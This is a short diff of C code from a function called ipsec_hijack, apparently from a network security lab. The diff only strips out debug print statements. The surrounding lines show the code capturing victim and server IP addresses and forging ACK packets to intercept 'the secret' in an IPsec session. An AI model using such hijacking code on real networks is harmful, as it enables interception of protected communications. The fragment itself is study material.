@@ -28,7 +28,6 @@ void ipsec_hijack(char *INTERFACE)
     init_net(&net);
     init_esp(&esp);
     init_txp(&txp);
-    printf("finish init\n");
     char *str = (char*)malloc(sizeof(char)*1024);
 
     fd_set readfds;
@@ -57,21 +56,12 @@ void ipsec_hijack(char *INTERFACE)
             first = false;
             strcpy(victim_ip, net.src_ip);
             strcpy(server_ip, net.dst_ip);
-            printf("pro: %02x\n", dev.addr.sll_protocol);
-            printf("addr: ");
-            for(int i = 0; i < dev.addr.sll_halen; i++){
-                printf("%02x:", dev.addr.sll_addr[i]);
-            }
-            printf("\n");
         }
-        // printf("%s\n", victim_ip);
-        // printf("%s\n", server_ip);
         if(*state == SEND_ACK){
             /*
             * when receiver receive a packet from sender, receiver should reply a ACK packet to sender, then sender will know that
             * the packet has been received successfully. So we also have to reply a ACK to server, after we receive the secret.
             */
-            // printf("state == SEND_ACK\n");
             send_msg(&dev, &net, &esp, &txp, NULL);
             *state = WAIT_PKT;
             get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip, test_for_dissect);
